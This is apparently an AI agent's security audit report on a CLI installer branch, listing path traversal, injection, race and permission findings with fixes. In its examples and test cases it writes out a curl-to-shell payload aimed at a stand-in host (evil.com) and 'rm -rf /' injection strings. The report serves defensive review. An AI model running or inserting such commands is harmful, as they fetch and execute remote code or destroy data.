# Security Audit Report

**Branch**: feat/add-scope-to-init
**Base**: main
**Date**: 2025-10-24
**Time**: 12:50
**Auditor**: DevFlow Security Agent

---

## Executive Summary

This audit reviewed the addition of scope support (user/local) to the DevFlow init command, focusing on git root detection, path validation, user input handling, and file installation security.

**Overall Security Posture**: GOOD with minor concerns

The implementation demonstrates strong security awareness with multiple defense layers:
- Command injection prevention in git operations
- Path validation and sanitization
- Input validation for scope selection
- Safe file operations with proper error handling

However, there are areas for improvement in defense-in-depth and edge case handling.

---

## Critical Findings

None identified.

---

## High Priority Findings

### H-1: Path Traversal Risk in Environment Variable Override

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 30-34, 41-45  
**Severity**: HIGH

**Vulnerable Code**:
```typescript
function getClaudeDirectory(): string {
  if (process.env.CLAUDE_CODE_DIR) {
    return process.env.CLAUDE_CODE_DIR;  // No validation
  }
  return path.join(getHomeDirectory(), '.claude');
}

function getDevFlowDirectory(): string {
  if (process.env.DEVFLOW_DIR) {
    return process.env.DEVFLOW_DIR;  // No validation
  }
  return path.join(getHomeDirectory(), '.devflow');
}
```

**Vulnerability Description**:
Environment variables `CLAUDE_CODE_DIR` and `DEVFLOW_DIR` are used directly without validation. An attacker who controls the environment (e.g., through malicious shell configuration, compromised CI/CD pipeline, or social engineering) could set these to arbitrary paths:

```bash
CLAUDE_CODE_DIR="/etc/passwd/../../sensitive" devflow init
DEVFLOW_DIR="../../../../root/.ssh" devflow init
```

This could lead to:
1. Files being written to arbitrary system locations
2. Overwriting critical system files
3. Privilege escalation if run with elevated permissions
4. Information disclosure by reading sensitive directories

**Attack Scenario**:
1. Attacker tricks user into running: `DEVFLOW_DIR=/tmp/malicious devflow init`
2. DevFlow creates malicious scripts in `/tmp/malicious/scripts/`
3. If user's PATH includes `/tmp/malicious/scripts/`, attacker achieves code execution

**Remediation**:
Add path validation to environment variable overrides:

```typescript
function getClaudeDirectory(): string {
  if (process.env.CLAUDE_CODE_DIR) {
    const dir = path.resolve(process.env.CLAUDE_CODE_DIR);
    
    // Validate path is safe
    if (!path.isAbsolute(dir)) {
      throw new Error('CLAUDE_CODE_DIR must be an absolute path');
    }
    
    // Prevent path traversal
    const normalized = path.normalize(dir);
    if (normalized !== dir || normalized.includes('..')) {
      throw new Error('CLAUDE_CODE_DIR contains invalid path components');
    }
    
    // Ensure it's within user's home or a standard location
    const home = getHomeDirectory();
    if (!dir.startsWith(home) && !dir.startsWith('/opt/') && !dir.startsWith('/usr/local/')) {
      console.warn('⚠️  WARNING: CLAUDE_CODE_DIR is outside standard locations');
    }
    
    return dir;
  }
  return path.join(getHomeDirectory(), '.claude');
}
```

Apply similar validation to `getDevFlowDirectory()`.

**References**: 
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- OWASP: Path Traversal

---

## Medium Priority Findings

### M-1: Command Injection Defense Incomplete

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 53-73, 309-324  
**Severity**: MEDIUM

**Current Protection**:
```typescript
// Validate git root path (security: prevent injection)
if (!gitRootRaw || gitRootRaw.includes('\n') || gitRootRaw.includes(';') || gitRootRaw.includes('&&')) {
  return null;
}
```

**Issue**:
While the validation catches common injection patterns, it's incomplete. The blacklist approach misses other shell metacharacters that could be exploited:

- `|` (pipe)
- `||` (OR operator)
- `&` (background execution)
- `$()` (command substitution)
- `` `command` `` (backticks)
- `>`, `<`, `>>` (redirects)
- `*`, `?`, `[` (globbing)

**Attack Scenario** (theoretical):
If `git rev-parse` could somehow return crafted output (unlikely but defense-in-depth):
```bash
# Hypothetical malicious git config
/tmp/repo||curl evil.com/steal|sh
```

**Current Code Already Safe** because:
1. `execSync` with fixed command `git rev-parse --show-toplevel` doesn't allow injection in the command itself
2. The `cwd` parameter is controlled by Node.js `process.cwd()`, not user input
3. Git is unlikely to return malicious paths in its output

**Remediation** (Defense-in-Depth):
Use a whitelist approach instead of blacklist:

```typescript
function getGitRoot(): string | null {
  try {
    const gitRootRaw = execSync('git rev-parse --show-toplevel', {
      cwd: process.cwd(),
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe']
    }).trim();

    // Whitelist validation: only allow safe path characters
    const safePathRegex = /^[a-zA-Z0-9_\-\/\.\s]+$/;
    if (!gitRootRaw || !safePathRegex.test(gitRootRaw)) {
      return null;
    }

    // Additional checks
    if (gitRootRaw.includes('..')) {
      return null;
    }

    const gitRoot = path.resolve(gitRootRaw);
    if (!path.isAbsolute(gitRoot)) {
      return null;
    }

    return gitRoot;
  } catch {
    return null;
  }
}
```

**References**: 
- CWE-78: OS Command Injection
- OWASP: Command Injection

---

### M-2: Scope Input Validation Missing Edge Cases

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 120, 152-167  
**Severity**: MEDIUM

**Vulnerable Code**:
```typescript
.option('--scope <type>', 'Installation scope: user (user-wide) or local (project-only)', /^(user|local)$/i)

// Interactive prompt validation
if (answer === 'local' || answer === 'l') {
  scope = 'local';
} else if (answer === 'user' || answer === 'u' || answer === '') {
  scope = 'user';
} else {
  console.error('❌ Invalid scope. Use "user" or "local"\n');
  process.exit(1);
}
```

**Issues**:
1. **Case Sensitivity Mismatch**: Commander regex accepts `User`, `LOCAL`, `LocAL` (case-insensitive), but the code only checks lowercase
2. **Whitespace Not Trimmed in CLI Option**: Interactive prompt trims input, but CLI option may not
3. **No Validation of CLI Option Value After Regex**: The regex prevents invalid values, but defensive validation is missing

**Attack Scenario**:
Limited impact, but could cause unexpected behavior:
```bash
devflow init --scope "  local  "  # May fail due to whitespace
devflow init --scope LOCAL         # Works due to /i flag, then lowercased
```

**Remediation**:
Add explicit validation and normalization:

```typescript
// After line 137
if (options.scope) {
  const normalizedScope = options.scope.trim().toLowerCase();
  if (normalizedScope !== 'user' && normalizedScope !== 'local') {
    console.error('❌ Invalid scope. Use "user" or "local"\n');
    process.exit(1);
  }
  scope = normalizedScope as 'user' | 'local';
} else {
  // ... interactive prompt
}
```

**References**: 
- CWE-20: Improper Input Validation

---

### M-3: Race Condition in File Installation

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 274-285, 292-303  
**Severity**: MEDIUM

**Vulnerable Code**:
```typescript
let settingsExists = false;
try {
  await fs.access(settingsPath);
  settingsExists = true;
  // Existing settings.json found - install as settings.devflow.json
  await fs.writeFile(devflowSettingsPath, settingsContent, 'utf-8');
  console.log('⚠️  Existing settings.json preserved → DevFlow config: settings.devflow.json');
} catch {
  // No existing settings.json - install normally
  await fs.writeFile(settingsPath, settingsContent, 'utf-8');
  console.log('✓ Settings configured');
}
```

**Vulnerability Description**:
TOCTOU (Time-of-Check Time-of-Use) race condition between `fs.access()` check and `fs.writeFile()` operation:

1. Thread A checks: `settings.json` doesn't exist
2. Thread B creates: `settings.json` (concurrent `devflow init` or user action)
3. Thread A writes: Overwrites `settings.json` that was just created

**Attack Scenario**:
1. Attacker runs multiple `devflow init` processes concurrently
2. Race condition causes one process to overwrite user's custom settings
3. User loses configuration (denial of service)

Or in concurrent CI/CD environments:
1. Two build agents install DevFlow simultaneously
2. One overwrites the other's settings
3. Inconsistent state

**Remediation**:
Use atomic file operations with exclusive creation flag:

```typescript
let settingsExists = false;
try {
  // Atomic operation: open with 'wx' flag (write + exclusive create)
  // This fails if file already exists, preventing race condition
  await fs.writeFile(settingsPath, settingsContent, { 
    encoding: 'utf-8',
    flag: 'wx'  // Create file, fail if exists
  });
  console.log('✓ Settings configured');
} catch (error: any) {
  if (error.code === 'EEXIST') {
    // File exists - install as settings.devflow.json instead
    settingsExists = true;
    await fs.writeFile(devflowSettingsPath, settingsContent, 'utf-8');
    console.log('⚠️  Existing settings.json preserved → DevFlow config: settings.devflow.json');
  } else {
    throw error;  // Unexpected error
  }
}
```

Apply same fix to CLAUDE.md installation.

**References**: 
- CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition
- OWASP: Race Conditions

---

### M-4: Insufficient Permission Validation for Local Scope

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 81-98, 199-207  
**Severity**: MEDIUM

**Vulnerable Code**:
```typescript
// Local scope - create .claude directory if it doesn't exist
try {
  await fs.mkdir(claudeDir, { recursive: true });
  console.log('✓ Local .claude directory ready');
} catch (error) {
  console.error(`❌ Failed to create ${claudeDir}:`, error);
  process.exit(1);
}
```

**Issues**:
1. No check if git root is writable before attempting installation
2. No validation that user owns the git repository
3. Could fail partway through installation, leaving inconsistent state
4. Error message doesn't provide actionable guidance

**Attack Scenario**:
User runs `devflow init` in a shared git repository:
1. Git root is `/opt/shared-repo/` (owned by different user)
2. User has read access but not write access
3. Installation fails after partial completion
4. Repository left in inconsistent state

Or malicious scenario:
1. Attacker creates world-writable git repo in `/tmp/trap`
2. Tricks user into running `devflow init` there
3. Attacker's code in `/tmp/trap/.devflow/scripts/` gets executed

**Remediation**:
Validate permissions before installation:

```typescript
// Local scope - validate and create .claude directory
try {
  // Check if we can write to git root
  const gitRoot = getGitRoot();
  if (!gitRoot) {
    throw new Error('Local scope requires a git repository');
  }
  
  // Validate ownership and permissions
  const gitRootStat = await fs.stat(gitRoot);
  const processUid = process.getuid ? process.getuid() : null;
  
  if (processUid !== null && gitRootStat.uid !== processUid) {
    console.warn('⚠️  WARNING: Installing into git repository owned by different user');
    console.warn(`   Repository owner: ${gitRootStat.uid}, Current user: ${processUid}`);
    
    const proceed = await promptUser('Continue with local installation? (y/N): ');
    if (!proceed) {
      console.log('❌ Cancelled. Use --scope user for user-wide installation.\n');
      process.exit(0);
    }
  }
  
  // Test write access before creating directories
  await fs.access(gitRoot, fs.constants.W_OK);
  
  await fs.mkdir(claudeDir, { recursive: true });
  console.log('✓ Local .claude directory ready');
} catch (error) {
  if (error.code === 'EACCES') {
    console.error(`❌ Permission denied: Cannot write to ${gitRoot}`);
    console.error('   Either run with appropriate permissions or use --scope user\n');
  } else {
    console.error(`❌ Failed to create ${claudeDir}:`, error);
  }
  process.exit(1);
}
```

**References**: 
- CWE-276: Incorrect Default Permissions
- CWE-732: Incorrect Permission Assignment

---

## Low Priority Findings

### L-1: Missing Path Canonicalization

**File**: `/workspace/devflow/src/cli/commands/init.ts`, `/workspace/devflow/src/cli/commands/uninstall.ts`  
**Lines**: init.ts:57, 65; uninstall.ts:57, 58  
**Severity**: LOW

**Issue**:
Paths are resolved but not canonicalized, which could lead to symbolic link confusion:

```typescript
const gitRoot = path.resolve(gitRootRaw);
if (!path.isAbsolute(gitRoot)) {
  return null;
}
```

**Attack Scenario**:
1. Attacker creates symlink: `/tmp/devflow-link -> /home/user/real-repo`
2. User runs `devflow init` in `/tmp/devflow-link`
3. Installation uses symlink path, not canonical path
4. Could bypass path-based security checks or cause confusion

**Remediation**:
Use `fs.realpath()` to resolve symlinks:

```typescript
const gitRoot = path.resolve(gitRootRaw);
if (!path.isAbsolute(gitRoot)) {
  return null;
}

// Canonicalize to resolve symlinks
try {
  const canonicalPath = await fs.realpath(gitRoot);
  return canonicalPath;
} catch {
  return null;  // Path doesn't exist or inaccessible
}
```

**Note**: This requires making `getGitRoot()` async, which is a larger refactor. Consider for future enhancement.

**References**: 
- CWE-61: UNIX Symbolic Link Following

---

### L-2: Script Chmod Lacks Error Handling Granularity

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 253-258  
**Severity**: LOW

**Vulnerable Code**:
```typescript
const scriptsDir = devflowDirectories.find(d => d.name === 'scripts')!.target;
const scripts = await fs.readdir(scriptsDir);
for (const script of scripts) {
  await fs.chmod(path.join(scriptsDir, script), 0o755);
}
```

**Issues**:
1. No validation that files are actually scripts (could chmod non-scripts)
2. No error handling if chmod fails on one file
3. Could make non-executable files executable (security issue)
4. Hardcoded 0o755 permissions (user+group+world readable)

**Attack Scenario**:
If an attacker can inject a malicious file into `src/claude/scripts/` before build:
1. Malicious file `backdoor.txt` is copied to scripts directory
2. `chmod 0o755` makes it executable
3. If user happens to execute it, attack succeeds

**Remediation**:
Add validation and better error handling:

```typescript
const scriptsDir = devflowDirectories.find(d => d.name === 'scripts')!.target;
const scripts = await fs.readdir(scriptsDir, { withFileTypes: true });

for (const script of scripts) {
  // Only chmod actual files, not directories
  if (!script.isFile()) {
    continue;
  }
  
  // Only chmod .sh or explicitly known script files
  const scriptPath = path.join(scriptsDir, script.name);
  if (script.name.endsWith('.sh') || script.name === 'statusline') {
    try {
      await fs.chmod(scriptPath, 0o755);
    } catch (error) {
      console.warn(`⚠️  Warning: Could not set permissions on ${script.name}`);
      // Continue with other scripts
    }
  }
}
```

**References**: 
- CWE-732: Incorrect Permission Assignment

---

### L-3: Unvalidated User Input in Readline

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 147-157  
**Severity**: LOW

**Current Code**:
```typescript
const answer = await new Promise<string>((resolve) => {
  rl.question('Choose scope (user/local) [user]: ', (input) => {
    rl.close();
    resolve(input.trim().toLowerCase() || 'user');
  });
});
```

**Issue**:
While low risk, readline input isn't length-limited or sanitized. An attacker could provide extremely long input causing:
1. Memory exhaustion (DoS)
2. Log pollution if input is logged
3. Terminal corruption with control characters

**Attack Scenario**:
```bash
# Input with control characters
echo -e "\x1b[31mMalicious\x1b[0m" | devflow init

# Or extremely long input
yes "local" | head -n 100000 | tr '\n' 'x' | devflow init
```

**Remediation**:
Add input length limits and sanitization:

```typescript
const answer = await new Promise<string>((resolve) => {
  rl.question('Choose scope (user/local) [user]: ', (input) => {
    rl.close();
    
    // Limit input length
    const sanitized = input.trim().slice(0, 10).toLowerCase();
    
    // Strip control characters
    const cleaned = sanitized.replace(/[\x00-\x1F\x7F]/g, '');
    
    resolve(cleaned || 'user');
  });
});
```

**References**: 
- CWE-20: Improper Input Validation
- CWE-770: Allocation of Resources Without Limits

---

### L-4: Information Disclosure in Error Messages

**File**: `/workspace/devflow/src/cli/commands/init.ts`  
**Lines**: 183-184, 204-205, 589-591  
**Severity**: LOW

**Vulnerable Code**:
```typescript
console.error('❌ Path configuration error:', error instanceof Error ? error.message : error);

console.error(`❌ Failed to create ${claudeDir}:`, error);

console.error('❌ Installation failed:', error);
```

**Issue**:
Error messages may leak sensitive information:
1. Full file paths (reveals directory structure)
2. System error messages (reveals OS version, permissions)
3. Stack traces in development mode

**Attack Scenario**:
Attacker uses error messages to map system:
1. Try installation with various invalid paths
2. Collect error messages revealing directory structure
3. Use information for targeted attacks

**Remediation**:
Sanitize error messages:

```typescript
console.error('❌ Path configuration error');
if (process.env.NODE_ENV === 'development') {
  console.error('   Debug:', error instanceof Error ? error.message : error);
} else {
  console.error('   Run with NODE_ENV=development for detailed error information');
}
```

**References**: 
- CWE-209: Generation of Error Message Containing Sensitive Information

---

## Security Score: 7/10

**Breakdown**:
- Command Injection Prevention: 8/10 (Good but could be more robust)
- Input Validation: 6/10 (Missing edge cases and environment validation)
- Path Security: 7/10 (Good git validation, but environment vars unvalidated)
- File Operations: 6/10 (Race conditions and permission issues)
- Error Handling: 8/10 (Generally good, minor info disclosure)
- Defense in Depth: 6/10 (Some missing layers)

**Strengths**:
1. Strong awareness of command injection risks
2. Explicit security comments in code
3. Path validation with multiple checks
4. Safe default behavior (never override existing files)
5. Proper error handling structure

**Weaknesses**:
1. Environment variable paths not validated (HIGH risk)
2. TOCTOU race conditions in file checks
3. Missing permission validation for local scope
4. Incomplete input validation

---

## Recommendation: REVIEW REQUIRED

**Rationale**:
While the branch demonstrates strong security awareness and implements multiple protection layers, the HIGH severity finding (H-1: Path Traversal Risk in Environment Variable Override) must be addressed before merging to main.

The current implementation is significantly more secure than no validation, but production use requires fixing the environment variable validation issue.

**Required Actions Before Merge**:
1. **MUST FIX**: H-1 - Add path validation to environment variable overrides
2. **SHOULD FIX**: M-3 - Fix race condition in file installation (use atomic operations)
3. **SHOULD FIX**: M-4 - Add permission validation for local scope installations
4. **CONSIDER**: M-1 - Strengthen command injection defense with whitelist approach

**Approved for Merge After**:
- H-1 is resolved with comprehensive path validation
- M-3 is resolved to prevent file race conditions
- All changes include test coverage for edge cases

**Additional Recommendations**:
1. Add integration tests for concurrent installation scenarios
2. Add tests for malicious environment variable values
3. Document security assumptions in code comments
4. Consider security-focused code review checklist for future PRs

---

## Testing Recommendations

### Security Test Cases to Add

**1. Environment Variable Injection Tests**:
```bash
# Test path traversal
CLAUDE_CODE_DIR="../../../etc" devflow init
DEVFLOW_DIR="$(echo /tmp/evil)" devflow init

# Test with shell metacharacters
CLAUDE_CODE_DIR="/tmp; rm -rf /" devflow init
DEVFLOW_DIR="/tmp$(malicious)" devflow init
```

**2. Concurrent Installation Tests**:
```bash
# Run multiple installations simultaneously
for i in {1..5}; do devflow init & done
wait
```

**3. Permission Tests**:
```bash
# Test installation in read-only git repo
git init /tmp/readonly-repo
chmod 555 /tmp/readonly-repo
cd /tmp/readonly-repo
devflow init --scope local
```

**4. Input Validation Tests**:
```bash
# Test invalid scope values
devflow init --scope "user; rm -rf /"
devflow init --scope "$(malicious)"

# Test with control characters
echo -e "\x1b[31mlocal\x1b[0m" | devflow init
```

**5. Symlink Tests**:
```bash
# Test with symlinked git repo
ln -s /real/repo /tmp/link
cd /tmp/link
devflow init --scope local
```

---

## Compliance and Standards

**OWASP Top 10 (2021) Relevant Items**:
- A03:2021 - Injection: Command injection prevention implemented, needs strengthening
- A01:2021 - Broken Access Control: Permission validation missing for local scope
- A04:2021 - Insecure Design: TOCTOU race condition in file operations

**CWE Coverage**:
- CWE-22: Path Traversal (H-1)
- CWE-78: OS Command Injection (M-1)
- CWE-20: Improper Input Validation (M-2, L-3)
- CWE-367: TOCTOU Race Condition (M-3)
- CWE-276: Incorrect Default Permissions (M-4)
- CWE-61: Symbolic Link Following (L-1)
- CWE-732: Incorrect Permission Assignment (L-2)
- CWE-209: Information Disclosure (L-4)

**Security Best Practices Applied**:
- Principle of Least Privilege: Partially applied (needs permission validation)
- Defense in Depth: Partially applied (multiple validation layers, but gaps exist)
- Fail Securely: Yes (returns null on validation failure)
- Input Validation: Partially applied (needs environment variable validation)
- Secure Defaults: Yes (never override existing files)

---

## Appendix: Code Review Notes

**Positive Security Patterns Observed**:
1. Explicit security comments indicating awareness: `// security: prevent injection`
2. Multiple validation checks on git root paths
3. Use of `path.resolve()` and `path.isAbsolute()` for path safety
4. Isolated stdio in execSync to prevent stderr leakage
5. Safe default behavior (preserve existing files)
6. Comprehensive error handling structure

**Areas for Improvement**:
1. Environment variable validation is missing
2. Consider using a security-focused path library (e.g., `@npmcli/path-scurry`)
3. Add security-focused unit tests
4. Document threat model and security assumptions
5. Consider adding security.md with responsible disclosure policy

**Code Quality Notes**:
- Clean separation of concerns (path functions, validation)
- Good use of TypeScript typing
- Clear function documentation
- Consistent error handling patterns

**Overall Assessment**:
This is a well-written security-conscious implementation with room for improvement. The developer clearly considered security during development, as evidenced by validation logic and security comments. Addressing the HIGH and MEDIUM findings will bring this to production-ready security standards.

